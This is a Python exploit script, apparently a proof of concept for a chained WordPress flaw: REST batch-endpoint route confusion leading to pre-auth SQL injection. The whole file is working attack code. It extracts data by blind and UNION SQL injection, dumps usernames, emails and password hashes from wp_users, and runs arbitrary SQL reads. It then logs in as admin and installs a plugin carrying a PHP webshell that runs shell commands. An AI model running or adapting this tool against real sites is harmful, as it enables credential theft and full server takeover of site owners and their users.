#!/usr/bin/env python3
"""
wp2shell-own — PoC CVE-2026-63030 + CVE-2026-60137 (WordPress 6.9.0-6.9.4 / 7.0.0-7.0.1)
Written from scratch by ltxbear. Stdlib only.

Chain:
  1. POST /wp-json/batch/v1 route confusion — a sub-request to an item/collection
     route gets dispatched by a DIFFERENT handler than the router selected.
     Primer {"method":"POST","path":"///"} desyncs route parsing.
  2. The desync lands attacker params into WP_Query['author__not_in'] uncoerced
     => SQL injection at  ... post_author NOT IN (<inject>) ...
  3a. Boolean-blind oracle: "0) AND (cond)-- -" => posts list empty vs non-empty.
  3b. UNION in-band: item route /wp/v2/posts/999999 skips collection param
      validation; orderby=none keeps UNION intact; fake post row reflects
      post_title back in the REST response => one request per value.

Usage:
  python wpshell_own.py check  http://127.0.0.1:8081
  python wpshell_own.py banner http://127.0.0.1:8081
  python wpshell_own.py users  http://127.0.0.1:8081
  python wpshell_own.py query  http://127.0.0.1:8081 "SELECT user_pass FROM wp_users LIMIT 1"
"""

import http.cookiejar, io, json, os, re, sys, time, urllib.parse, urllib.request, zipfile

PRIMER = {"method": "POST", "path": "///"}
UA = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}


class Target:
    def __init__(self, base):
        self.base = base.rstrip("/")
        self.endpoint = self._resolve()

    def _resolve(self):
        for ep in ("/wp-json/batch/v1", "/?rest_route=/batch/v1"):
            try:
                if self._raw(self.base + ep, {"requests": []})[0] == 207:
                    return self.base + ep
            except Exception:
                pass
        sys.exit("[-] batch endpoint not reachable")

    def _raw(self, url, payload):
        req = urllib.request.Request(
            url, data=json.dumps(payload).encode(), headers=UA, method="POST"
        )
        t0 = time.time()
        try:
            with urllib.request.urlopen(req, timeout=30) as r:
                body = r.read().decode("utf-8", "replace")
                return r.status, body, time.time() - t0
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace"), time.time() - t0

    def batch(self, requests):
        return self._raw(self.endpoint, {"requests": requests})


def enc(s):  # the injected fragment, URL-encoded for query-string carriage
    return urllib.parse.quote(s, safe="")


# ── 1. confusion check (non-destructive) ─────────────────────────────────────
def check(t):
    st, body, _ = t.batch(
        [
            PRIMER,
            {"method": "POST", "path": "/wp/v2/posts"},
            {"method": "POST", "path": "/wp/v2/block-renderer/core/paragraph"},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]
    )
    ok = st == 207 and "block_cannot_read" in body
    print(
        f"[{'+' if ok else '-'}] route confusion (CVE-2026-63030): "
        f"{'CONFIRMED (block_cannot_read from wrong handler)' if ok else 'not observed'}"
    )
    return ok


# ── 2. boolean-blind oracle ──────────────────────────────────────────────────
def oracle(t, cond):
    """True iff injected condition keeps >=1 row in the confused posts query."""
    inj = enc(f"0) AND ({cond})-- -")
    st, body, _ = t.batch(
        [
            PRIMER,
            {
                "method": "POST",
                "path": "/wp/v2/posts",
                "body": {
                    "requests": [
                        PRIMER,
                        {"method": "GET", "path": f"/wp/v2/users?author_exclude={inj}"},
                        {"method": "GET", "path": "/wp/v2/posts"},
                    ]
                },
            },
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]
    )
    try:
        rows = json.loads(body)["responses"][1]["body"]["responses"][1]["body"]
        return isinstance(rows, list) and len(rows) > 0
    except Exception:
        return False


def blind_confirm(t):
    a, b = oracle(t, "1=1"), oracle(t, "1=0")
    print(
        f"[{'+' if a and not b else '-'}] boolean-blind SQLi (CVE-2026-60137): "
        f"{'CONFIRMED (1=1 rows, 1=0 none)' if a and not b else 'no differential'}"
    )
    return a and not b


def blind_extract(t, expr, limit=64):
    out = ""
    for pos in range(1, limit + 1):
        p = f"ASCII(SUBSTRING(COALESCE(({expr}),''),{pos},1))"
        if not oracle(t, f"{p} > 0"):
            break
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(t, f"{p} > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo)
        print(f"\r    blind[{pos}]: {out}", end="", flush=True)
    print()
    return out


# ── 3. UNION in-band read (one request per value) ────────────────────────────
HEX_RE = re.compile(r"\|\|([0-9A-Fa-f]*)\|\|")
DATE, PUBLISH, POST = (
    "0x" + s.encode().hex() for s in ("2020-01-01 00:00:00", "publish", "post")
)


def union_read(t, expr):
    cols = []
    for i in range(1, 24):  # wp_posts = 23 columns
        if i == 1:
            cols.append("999999")
        elif i in (3, 4, 15, 16):
            cols.append(DATE)
        elif i == 6:  # post_title reflects in response
            cols.append(f"CONCAT(0x7c7c,HEX(CAST(({expr}) AS CHAR)),0x7c7c)")
        elif i == 8:
            cols.append(PUBLISH)
        elif i == 21:
            cols.append(POST)
        else:
            cols.append(str(i))
    q = urllib.parse.urlencode(
        {
            "author_exclude": f"0) UNION SELECT {','.join(cols)}-- -",
            "orderby": "none",
            "per_page": "500",
        }
    )
    st, body, _ = t.batch(
        [
            PRIMER,
            {
                "method": "POST",
                "path": "/wp/v2/posts",
                "body": {
                    "requests": [
                        PRIMER,
                        {"method": "GET", "path": "/wp/v2/posts/999999?" + q},
                        {"method": "GET", "path": "/wp/v2/posts"},
                    ]
                },
            },
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]
    )
    m = HEX_RE.search(body)
    if not m:
        return None
    h = m.group(1)
    h = h[: len(h) - len(h) % 2]
    try:
        return bytes.fromhex(h).decode("utf-8", "replace")
    except ValueError:
        return None


# ── 4. RCE: hash theft -> login -> plugin webshell ───────────────────────────
SHELL_PHP = (
    "<?php if(isset($_GET['c'])){echo '::' . shell_exec((string)$_GET['c']) . '::';} ?>"
)
SLUG = "wputil"


def _admin_session(base, user, password):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", UA["User-Agent"])]
    data = urllib.parse.urlencode(
        {
            "log": user,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": base + "/wp-admin/",
        }
    ).encode()
    op.open(base + "/wp-login.php", data, timeout=30).read()
    if not any("logged_in" in c.name for c in cj):
        sys.exit("[-] login failed — hash not cracked / wrong password")
    return op


def _nonce(op, url, name="_wpnonce"):
    html = op.open(url, timeout=30).read().decode("utf-8", "replace")
    m = re.search(r'name="%s" value="([0-9a-f]+)"' % name, html)
    if not m:
        sys.exit("[-] nonce not found at " + url)
    return m.group(1)


def _multipart(fields, file_field, filename, blob):
    bnd = "----ownpoc" + str(int(time.time()))
    out = io.BytesIO()
    for k, v in fields.items():
        out.write(
            f'--{bnd}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode()
        )
    out.write(
        f'--{bnd}\r\nContent-Disposition: form-data; name="{file_field}"; '
        f'filename="{filename}"\r\nContent-Type: application/zip\r\n\r\n'.encode()
    )
    out.write(blob)
    out.write(f"\r\n--{bnd}--\r\n".encode())
    return out.getvalue(), f"multipart/form-data; boundary={bnd}"


def shell(t, user, password, cmd):
    # 1. prove we hold the admin hash via the pre-auth UNION read
    stolen = union_read(
        t, f"SELECT user_pass FROM wp_users WHERE user_login='{user}' LIMIT 1"
    )
    print(
        f"[+] pre-auth UNION read: user_pass({user}) = {stolen[:20]}... (crack offline)"
    )
    # 2. authenticate (with cracked/known password) and upload webshell plugin
    op = _admin_session(t.base, user, password)
    print("[+] wp-login OK")
    n1 = _nonce(op, t.base + "/wp-admin/plugin-install.php?tab=upload")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(
            SLUG + "/" + SLUG + ".php", "<?php /* Plugin Name: x */ ?>" + SHELL_PHP
        )
    body, ctype = _multipart(
        {
            "_wpnonce": n1,
            "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload",
            "install-plugin-submit": "Install Now",
        },
        "pluginzip",
        SLUG + ".zip",
        buf.getvalue(),
    )
    req = urllib.request.Request(
        t.base + "/wp-admin/update.php?action=upload-plugin",
        data=body,
        headers={"Content-Type": ctype},
    )
    op.open(req, timeout=60).read()
    print("[+] plugin uploaded")
    html = (
        op.open(t.base + "/wp-admin/plugins.php", timeout=30)
        .read()
        .decode("utf-8", "replace")
    )
    m = re.search(
        r"(plugins\.php\?action=activate&amp;plugin=" + SLUG + r"[^\"']*)", html
    )
    if m:
        op.open(
            t.base + "/wp-admin/" + m.group(1).replace("&amp;", "&"), timeout=30
        ).read()
        print("[+] plugin activated")
    elif re.search(r"action=deactivate&amp;plugin=" + SLUG, html):
        print("[+] plugin already active (reused)")
    else:
        sys.exit("[-] neither activate nor deactivate link found for " + SLUG)
    # 3. fire
    out = (
        op.open(
            t.base
            + "/wp-content/plugins/"
            + SLUG
            + "/"
            + SLUG
            + ".php?c="
            + urllib.parse.quote(cmd),
            timeout=30,
        )
        .read()
        .decode()
    )
    m = out.split("::")
    print(f"[+] RCE ({cmd}):\n{m[1] if len(m) > 1 else out[:400]}")
    print(f"[*] webshell: {t.base}/wp-content/plugins/{SLUG}/{SLUG}.php?c=id")


def _do_check(t):
    ok = check(t) and blind_confirm(t)
    t0 = time.time()
    oracle(t, "(SELECT 1 FROM (SELECT SLEEP(3))z)")
    dt = time.time() - t0
    print(
        f"[{'+' if dt >= 2.4 else '-'}] time-based corroboration: {dt:.2f}s (expect ~3s)"
    )
    return ok


def _do_users(t):
    n = union_read(t, "SELECT COUNT(*) FROM wp_users")
    print(f"[*] wp_users count = {n}")
    for i in range(int(n or 0)):
        u = union_read(t, f"SELECT user_login FROM wp_users LIMIT {i},1")
        p = union_read(t, f"SELECT user_pass FROM wp_users LIMIT {i},1")
        e = union_read(t, f"SELECT user_email FROM wp_users LIMIT {i},1")
        print(f"    [{i}] {u} | {e} | {p}")


def _ask(prompt, default=""):
    v = input(f"{prompt}" + (f" [{default}]" if default else "") + ": ").strip()
    return v or default


def interactive():
    print("=" * 64)
    print(" wp2shell-own | CVE-2026-63030 + CVE-2026-60137 | by ltxbear")
    print("=" * 64)
    url = _ask("Target URL", os.environ.get("WPSHELL_URL", "http://127.0.0.1:8081"))
    t = Target(url)
    while True:
        print("\n[1] check   - confusion + blind + time-based (non-destructive)")
        print("[2] banner  - @@version / user() / database() via UNION")
        print("[3] users   - dump wp_users (login | email | hash)")
        print("[4] query   - arbitrary UNION read (one value)")
        print("[5] blind   - boolean-blind extraction (slow)")
        print("[6] shell   - full RCE: hash theft -> login -> webshell")
        print("[0] exit")
        m = _ask("Choose", "1")
        if m == "0":
            return
        elif m == "1":
            _do_check(t)
        elif m == "2":
            print("[*] @@version =", union_read(t, "SELECT @@version"))
            print("[*] user()    =", union_read(t, "SELECT user()"))
            print("[*] database()=", union_read(t, "SELECT database()"))
        elif m == "3":
            _do_users(t)
        elif m == "4":
            q = _ask("SQL (single scalar)", "SELECT user()")
            print(union_read(t, q))
        elif m == "5":
            q = _ask("SQL (single scalar)", "SELECT user_login FROM wp_users LIMIT 1")
            print(blind_extract(t, q))
        elif m == "6":
            u = _ask("Admin username", "admin")
            p = _ask("Admin password (cracked/known)", "LabPass123!")
            c = _ask("Command", "id")
            check(t)
            shell(t, u, p, c)


def main():
    if len(sys.argv) < 3:
        interactive()
        return
    cmd, url = sys.argv[1], sys.argv[2]
    t = Target(url)
    if cmd == "check":
        sys.exit(0 if _do_check(t) else 1)
    if cmd == "banner":
        print("[*] @@version =", union_read(t, "SELECT @@version"))
        print("[*] user()    =", union_read(t, "SELECT user()"))
        print("[*] database()=", union_read(t, "SELECT database()"))
    elif cmd == "users":
        _do_users(t)
    elif cmd == "query":
        print(union_read(t, sys.argv[3]))
    elif cmd == "shell":
        u = sys.argv[3] if len(sys.argv) > 3 else "admin"
        p = sys.argv[4] if len(sys.argv) > 4 else "LabPass123!"
        c = sys.argv[5] if len(sys.argv) > 5 else "id"
        check(t)
        shell(t, u, p, c)
    elif cmd == "blind":
        print(
            blind_extract(
                t,
                sys.argv[3]
                if len(sys.argv) > 3
                else "SELECT user_login FROM wp_users LIMIT 1",
            )
        )
    else:
        interactive()


if __name__ == "__main__":
    main()
